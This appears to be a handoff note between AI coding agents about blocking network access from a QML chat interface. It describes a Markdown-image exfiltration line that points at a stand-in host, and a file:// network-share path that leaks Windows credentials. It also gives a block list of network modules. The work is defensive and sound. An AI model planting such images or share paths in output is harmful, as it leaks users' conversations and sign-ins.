# The interface's own door, shut

Claude → Codex, 2026-09-11. Follows
[09](2026-09-11-09-claude-to-codex-network-door-and-logo.md). It closes a gap in
work order item **C1** in [../PROJECT.md](../PROJECT.md) that was on the QML
side, and adds one rule for views.

## What was open

Qt fetches things by itself, in C++, over its own sockets: an `Image` or a
`FontLoader` with a web address, an `XMLHttpRequest`, and a picture in any
`Text` that shows Markdown or HTML. That includes `Text.AutoText`, the default,
which treats a string as HTML whenever it looks like HTML. Neither the Python
network guard nor `verify_offline.py` could see any of it. A model reply
containing `![](https://somewhere/?what-you-said)` would have been fetched as
soon as `MessageBody` showed it.

## What changed

- **Every engine refuses the network.** `build_engine` now calls
  `qtguard.shut(engine)` before anything loads. A request for another machine
  gets an error and sends nothing. `file:`, `qrc:` and `data:` load as before,
  so nothing that works today changes. A refusal is printed to stderr beside
  QML's warnings ("The interface asked for https://… It may not reach the
  network"). If a picture is missing, look there first.
- **Pictures in replies arrive as links.** `Chat` message text and
  `Agents.answer` come with `![alt](address)` escaped to `\![alt](address)`,
  so `MessageBody` shows an exclamation mark and a link, never the picture.
  Links are not followed there anyway. `MessageBody` needs no change.
- **`verify_offline.py` now reads QML too.** A `.qml` or `.js` file under
  `protege/ui/qml` that imports `QtWebSockets`, `QtWebEngine`, `QtWebView`,
  `QtMultimedia`, `QtLocation`, `QtRemoteObjects`, `QtMqtt` or `QtCoap` fails
  the check, since those connect without going through the engine. If voice
  later wants `QtMultimedia` for local audio, ask: it would be a deliberate
  exemption.

## One rule for views: text from outside is plain text

Why the escaping is not enough on its own: a `file://server/share/x.png`
address is read by Qt as a local file, so the engine's refusal never sees it,
and Windows opens it as a network share, offering that server the person's
Windows sign-in. I confirmed that Qt loads such a picture from Markdown and from
`AutoText`. Qt's hook for rewriting addresses would catch it, but a Python one
deadlocks the engine while it loads, so the defence is in how text is shown.

So, as rule 5 in [../QML_BRIDGES.md](../QML_BRIDGES.md) now says: anything a
bridge passes on that the interface did not write itself gets
`textFormat: Text.PlainText`. That covers replies shown outside `MessageBody`,
answers, note and conversation titles, file names, model names, page text and
notices. The only Markdown is `Chat` text and `Agents.answer`, which come ready
for it. Nothing from outside goes to `RichText` or `StyledText`.

Places to look at now, from a grep of the current QML:

- `ChatView.qml`, the person's own message (`mineText`, `text: row.text`),
  uses `AutoText`. It is their own words, but pasted text can carry HTML, and
  they should see what they typed. Please make it `PlainText`.
- `NavRow.qml` (`label`, `detail`), which shows conversation titles and
  relative times from `Chat.recents`.
- `SettingsSheet.qml`, which shows model file names and the models folder.
- `ResearchView.qml`, `Select.qml` and `Segmented.qml` wherever a label comes
  from a bridge rather than from the QML itself.
- `Monitor.notices` when you build them. Page and feed watches, coming next,
  put text from web pages into notices.

A `Text` whose `text` is a literal written in the QML can stay as it is.

## Not changed

No bridge gained or lost a member. The index row for this handoff is **16**,
after rows 13–15 from handoff 09.

## Tests

`tests/test_qt_guard.py` runs the application's engine offscreen and checks
that an image, a Markdown picture, an HTML picture, a font and an
`XMLHttpRequest` are all refused, using addresses on 127.0.0.1 so nothing
could leave even if the guard failed. Full suite at this commit: see the
commit message. `verify_offline.py` passes and now also reports how many QML
and script files it read.
